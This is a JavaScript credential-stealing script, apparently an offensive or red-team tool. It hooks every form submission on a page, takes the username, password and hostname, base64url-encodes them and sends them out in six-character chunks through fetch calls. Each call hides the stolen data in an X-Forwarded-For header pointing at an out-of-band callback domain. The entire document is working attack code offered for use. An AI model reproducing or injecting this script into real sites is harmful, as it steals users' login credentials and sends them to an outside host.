function toBase64Url(str) {
    const base64 = btoa(unescape(encodeURIComponent(str)));

    // Replace the URL-unsafe characters.
    return base64
    .replace(/\+/g, '-') // Replace + with -
    .replace(/\//g, '_') // Replace / with _
    .replace(/=/g, '');  // Remove padding =
}

function getCreds() {
    const debug = true;
    if (debug) {
        console.log("[*] Looking for credentials...");
    }

    // Set an interval to check repeatedly if the webpage has finished loading.
    const readyStateCheckInterval = setInterval(function() {
        // Check if the document's loading process is complete.
        if (document.readyState === "complete") {
            // If the page is loaded, stop the repeated checks.
            clearInterval(readyStateCheckInterval);

            // This function finds the username and password and prints them to the console.
            const logCapturedCredentials = function() {
                const passwordBoxes = document.querySelectorAll("input[type=password]");
                const textInputs = document.querySelectorAll("input[type=text], input[type=email]"); // Also check for email fields
                let username = "";
                let password = "";

                // Convert NodeList to an Array to check for inclusion.
                const passwordBoxesArray = Array.from(passwordBoxes);

                // Find the first text or email input that is not a password box and has a value.
                for (const input of textInputs) {
                    if (!passwordBoxesArray.includes(input) && input.value) {
                        username = input.value;
                        break;
                    }
                }

                // Get the value from the first password field that has a value.
                for (const pbox of passwordBoxes) {
                    if (pbox.value) {
                        password = pbox.value;
                        break;
                    }
                }

                // Print results
                if (password) {
                    if (debug) {
                        console.log("[+] Credential Captured");
                        console.log("[>] Username: ", username || "(not found)");
                        console.log("[>] Password: ", password);
                        console.log("[>] Domain: ", window.location.hostname);
                        console.log("[*] Sending credentials...");
                        console.log("[i] Using target url: ", "https://example.com/");
                        console.log("[i] Using exfil header: ", "'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'");
                    }

                    const payload = toBase64Url(username + ':' + password + '@' + window.location.hostname);

                    if (debug) {console.log('[i] Sending payload:', payload);}

                    const chunks = payload.match(/.{1,6}/g) || [];
                    chunks.forEach((chunk, index) => {
                        if (debug) {console.log(`[>] Sending chunk ${index + 1}: "${chunk}"`);}
                        fetch('https://example.com/', {headers: {'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'.replace('{{PAYLOAD}}', chunk)}});
                    });

                    fetch('https://example.com/', {headers: {'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'}});
                }
            };

            // This function runs when a form is about to be submitted.
            const formSubmitHandler = function(event) {
                // Log the credentials to the console before the form is submitted.
                logCapturedCredentials();
            };

            // Find all forms on the page and attach our handler.
            const allForms = document.querySelectorAll("form");
            allForms.forEach(form => {
                // Use the 'submit' event to ensure we capture data just before submission.
                form.addEventListener("submit", formSubmitHandler);
            });

        }
    }, 100); // Check every 100 milliseconds.
}

getCreds();
